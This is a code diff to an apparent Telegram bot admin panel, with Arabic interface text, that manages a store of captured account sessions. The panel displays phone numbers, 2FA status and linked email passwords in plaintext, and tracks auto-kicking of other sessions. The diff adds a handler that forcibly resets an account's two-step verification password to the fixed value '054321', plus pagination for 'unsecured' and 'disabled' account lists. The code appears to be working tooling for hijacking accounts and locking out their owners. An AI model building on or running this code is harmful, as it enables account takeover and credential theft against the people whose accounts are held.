@@ -104,7 +104,7 @@ async def _guard_session_row(callback: CallbackQuery, session) -> bool:
 _KIND_BY_PREFIX = {v: k for k, v in CB.items()}
 
 
-async def _render_session_detail(callback: CallbackQuery, session, page: int = 0):
+async def _render_session_detail(callback: CallbackQuery, session, page: int = 0, source: str = "main"):
     phone = session["phone"]
     sid = session["id"]
     username = session["username"] or "لا يوجد"
@@ -121,7 +121,13 @@ async def _render_session_detail(callback: CallbackQuery, session, page: int = 0
         if email_pw and login_mail != "❌ غير مربوط":
             mail_lines += f"\n🔑 كلمة سر البريد: <code>{h(email_pw)}</code>"
     secured_stat = "🔒 مؤمّنة" if database.row_flag(session, "secured") else "—"
-    private_stat = "⭐ خاصة (A1)" if database.row_flag(session, "a1_only") else "—"
+    
+    # الخصوصية تظهر فقط للسوبر أدمن
+    privacy_line = ""
+    if is_super_admin(callback.from_user.id):
+        private_stat = "⭐ خاصة (A1)" if database.row_flag(session, "a1_only") else "—"
+        privacy_line = f"⭐ الخصوصية: {private_stat}\n"
+
     kick_stage = database.row_get(session, "auto_kick_stage")
     if kick_stage is None:
         kick_line = "—"
@@ -134,7 +140,8 @@ async def _render_session_detail(callback: CallbackQuery, session, page: int = 0
     else:
         kick_line = "⏳ طرد: محاولة فورية"
     text = (
-        f"📱 <code>{h(phone)}</code>\n\n"
+        f"📱 <code>{h(phone)}</code>\n"
+        f"🆔 ID الحساب: <code>{sid}</code>\n\n"
         f"👤 الاسم: {h(full_name)}\n"
         f"🔖 اليوزر: @{h(username)}\n"
         f"🔐 التحقق بخطوتين: {two_fa_stat}\n"
@@ -143,13 +150,18 @@ async def _render_session_detail(callback: CallbackQuery, session, page: int = 0
         f"📡 فحص مباشر: {live_stat}\n"
         f"🛡️ خط التأمين: {kick_line}\n"
         f"🔒 التأمين: {secured_stat}\n"
-        f"⭐ الخصوصية: {private_stat}\n"
+        f"{privacy_line}"
         f"📅 تاريخ التسجيل: {h(created_at)}"
         + ADMIN_FOOTER
     )
     await callback.message.edit_text(
         text,
-        reply_markup=session_detail_keyboard(sid, page=page, is_super_admin=is_super_admin(callback.from_user.id)),
+        reply_markup=session_detail_keyboard(
+            sid, 
+            page=page, 
+            is_super_admin=is_super_admin(callback.from_user.id),
+            source=source
+        ),
         parse_mode="HTML",
     )
     await track_admin_phone_message(
@@ -208,6 +220,39 @@ async def force_mail_process(callback: CallbackQuery):
         callback.message.chat.id,
         callback.message.message_id,
     )
+
+
+@dp.callback_query(F.data.regexp(r"^df\d+$"))
+async def admin_direct_2fa_handler(callback: CallbackQuery, state: FSMContext):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    session = await admin_resolve.get_session_from_callback(callback.data, "direct_2fa")
+    if not await _guard_session_row(callback, session):
+        return
+    phone, sid = session["phone"], session["id"]
+
+    await callback.answer("⏳ جاري تعيين التحقق لـ 054321...")
+    await callback.message.edit_text(
+        f"⏳ جاري تغيير التحقق بخطوتين للرقم <code>{h(phone)}</code> إلى <code>054321</code>..." + ADMIN_FOOTER,
+        parse_mode="HTML"
+    )
+
+    res = await session_manager.set_direct_2fa(phone, "054321")
+
+    if res["success"]:
+        await callback.message.edit_text(
+            f"✅ تم تغيير التحقق بخطوتين بنجاح إلى <code>054321</code> للرقم <code>{h(phone)}</code>." + ADMIN_FOOTER,
+            parse_mode="HTML",
+            reply_markup=back_to_session_keyboard(sid)
+        )
+    else:
+        await callback.message.edit_text(
+            f"❌ فشل تغيير التحقق: <code>{h(res.get('error',''))}</code>" + ADMIN_FOOTER,
+            parse_mode="HTML",
+            reply_markup=back_to_session_keyboard(sid)
+        )
+    await callback.answer()
 
 
 async def _export_session_message(callback: CallbackQuery, session):
@@ -814,8 +859,9 @@ async def session_detail(callback: CallbackQuery, state: FSMContext):
     
     st_data = await state.get_data()
     page = st_data.get("last_page", 0)
+    source = st_data.get("last_source", "main")
     
-    await _render_session_detail(callback, session, page=page)
+    await _render_session_detail(callback, session, page=page, source=source)
     await callback.answer()
 
 
@@ -828,6 +874,12 @@ async def back_to_sessions(callback: CallbackQuery, state: FSMContext):
     
     st_data = await state.get_data()
     page = st_data.get("last_page", 0)
+    source = st_data.get("last_source", "main")
+    
+    if source == "unsecured":
+        return await unsecured_page_handler(callback, state)
+    elif source == "disabled":
+        return await disabled_page_handler(callback, state)
     
     sessions = await _sessions_for_admin(uid)
     text = await _admin_panel_text(uid)
@@ -1354,13 +1406,20 @@ async def purge_invalid_confirm(callback: CallbackQuery):
 # الحسابات الغير مأمنه والجلسات المعطلة
 # ──────────────────────────────────────────
 @dp.callback_query(F.data == "list_unsecured")
-async def list_unsecured_handler(callback: CallbackQuery):
+async def list_unsecured_handler(callback: CallbackQuery, state: FSMContext):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
     uid = callback.from_user.id
+    await state.update_data(last_source="unsecured", last_page=0)
     sessions = await _sessions_for_admin(uid)
-    unsecured = [s for s in sessions if not database.row_flag(s, "secured")]
+    
+    is_sa = is_super_admin(uid)
+    unsecured = []
+    for s in sessions:
+        if not database.row_flag(s, "secured"):
+            if is_sa or not database.row_flag(s, "a1_only"):
+                unsecured.append(s)
     
     if not unsecured:
         await callback.answer("✅ جميع الحسابات مأمنة!", show_alert=True)
@@ -1369,18 +1428,49 @@ async def list_unsecured_handler(callback: CallbackQuery):
     text = f"🔓 <b>الحسابات الغير مأمنه ({len(unsecured)})</b>\n\nاختر حساباً للتفاصيل أو استخدم زر التأمين بالأسفل." + ADMIN_FOOTER
     await callback.message.edit_text(
         text,
-        reply_markup=unsecured_sessions_keyboard(unsecured),
+        reply_markup=unsecured_sessions_keyboard(unsecured, page=0),
+        parse_mode="HTML"
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data.startswith("unsecured_page_"))
+async def unsecured_page_handler(callback: CallbackQuery, state: FSMContext):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    uid = callback.from_user.id
+    page = int(callback.data.split("_")[-1])
+    await state.update_data(last_source="unsecured", last_page=page)
+    
+    sessions = await _sessions_for_admin(uid)
+    is_sa = is_super_admin(uid)
+    unsecured = []
+    for s in sessions:
+        if not database.row_flag(s, "secured"):
+            if is_sa or not database.row_flag(s, "a1_only"):
+                unsecured.append(s)
+    
+    if not unsecured:
+        await callback.answer("✅ لا توجد حسابات.")
+        return
+
+    text = f"🔓 <b>الحسابات الغير مأمنه ({len(unsecured)})</b>" + ADMIN_FOOTER
+    await callback.message.edit_text(
+        text,
+        reply_markup=unsecured_sessions_keyboard(unsecured, page=page),
         parse_mode="HTML"
     )
     await callback.answer()
 
 
 @dp.callback_query(F.data == "list_disabled")
-async def list_disabled_handler(callback: CallbackQuery):
+async def list_disabled_handler(callback: CallbackQuery, state: FSMContext):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
     uid = callback.from_user.id
+    await state.update_data(last_source="disabled", last_page=0)
     sessions = await _sessions_for_admin(uid)
     disabled = [s for s in sessions if not s["valid"]]
     
@@ -1391,7 +1481,32 @@ async def list_disabled_handler(callback: CallbackQuery):
     text = f"🔴 <b>الجلسات المعطلة ({len(disabled)})</b>\n\nهذه الحسابات فقدت الاتصال أو تم إنهاء جلستها." + ADMIN_FOOTER
     await callback.message.edit_text(
         text,
-        reply_markup=disabled_sessions_keyboard(disabled),
+        reply_markup=disabled_sessions_keyboard(disabled, page=0),
+        parse_mode="HTML"
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data.startswith("disabled_page_"))
+async def disabled_page_handler(callback: CallbackQuery, state: FSMContext):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    uid = callback.from_user.id
+    page = int(callback.data.split("_")[-1])
+    await state.update_data(last_source="disabled", last_page=page)
+    
+    sessions = await _sessions_for_admin(uid)
+    disabled = [s for s in sessions if not s["valid"]]
+    
+    if not disabled:
+        await callback.answer("✅ لا توجد جلسات معطلة.")
+        return
+
+    text = f"🔴 <b>الجلسات المعطلة ({len(disabled)})</b>" + ADMIN_FOOTER
+    await callback.message.edit_text(
+        text,
+        reply_markup=disabled_sessions_keyboard(disabled, page=page),
         parse_mode="HTML"
     )
     await callback.answer()
